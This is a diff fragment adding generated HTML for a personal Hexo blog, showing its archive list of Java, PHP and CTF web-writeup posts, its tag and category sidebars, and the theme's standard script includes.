+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E6%A0%B8%E5%BF%83%E7%B1%BB/">Java核心类</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E5%8F%8D%E5%B0%84/">Java反射</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">Java异常处理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E6%B3%A8%E8%A7%A3/">Java注解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/">Java面向对象</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/Java/Java%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/">Java快速入门</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2018 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span>
+            <a class="archive-post-title" href="/2018/09/17/PHP%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/">PHP快速入门</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span>
+            <a class="archive-post-title" href="/2018/05/02/ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B03%EF%BC%89/">ichunqiu 上web题writeup（持续更新3）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span>
+            <a class="archive-post-title" href="/2018/05/01/ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B02%EF%BC%89/">ichunqiu 上web题writeup（持续更新2）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/">ichunqiu 上web题writeup（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span>
+            <a class="archive-post-title" href="/2018/02/15/%E5%B9%B4%E5%85%B3%E6%97%B6%E5%88%BB%E7%9A%84%E6%84%9F%E6%83%B3/">年关时刻的感想</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2017 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2017/12/03/VPS-Hexo/">VPS Hexo 搭建个人博客</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="VPS & hexo">
+                <span class="iconfont-archer">&#xe606;</span>
+                VPS & hexo
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="瞎想">
+                <span class="iconfont-archer">&#xe606;</span>
+                瞎想
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="总结">
+                <span class="iconfont-archer">&#xe606;</span>
+                总结
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="2020">
+                <span class="iconfont-archer">&#xe606;</span>
+                2020
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="懒人养成">
+                <span class="iconfont-archer">&#xe606;</span>
+                懒人养成
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="漏洞复现">
+                <span class="iconfont-archer">&#xe606;</span>
+                漏洞复现
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Java tomcat">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java tomcat
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="文件读取">
+                <span class="iconfont-archer">&#xe606;</span>
+                文件读取
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="文件包含">
+                <span class="iconfont-archer">&#xe606;</span>
+                文件包含
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="调试">
+                <span class="iconfont-archer">&#xe606;</span>
+                调试
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shiro-core">
+                <span class="iconfont-archer">&#xe606;</span>
+                shiro-core
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="笔记">
+                <span class="iconfont-archer">&#xe606;</span>
+                笔记
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="设计模式">
+                <span class="iconfont-archer">&#xe606;</span>
+                设计模式
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="创建型模式">
+                <span class="iconfont-archer">&#xe606;</span>
+                创建型模式
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="bug">
+                <span class="iconfont-archer">&#xe606;</span>
+                bug
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CTF">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CTF
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="瞎想">
+            <span class="iconfont-archer">&#xe60a;</span>
+            瞎想
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Java">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Java
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="复盘总结">
+            <span class="iconfont-archer">&#xe60a;</span>
+            复盘总结
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="懒人养成">
+            <span class="iconfont-archer">&#xe60a;</span>
+            懒人养成
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞复现">
+            <span class="iconfont-archer">&#xe60a;</span>
+            漏洞复现
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="笔记">
+            <span class="iconfont-archer">&#xe60a;</span>
+            笔记
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="设计模式">
+            <span class="iconfont-archer">&#xe60a;</span>
+            设计模式
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="转角遇见的bug">
+            <span class="iconfont-archer">&#xe60a;</span>
+            转角遇见的bug
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
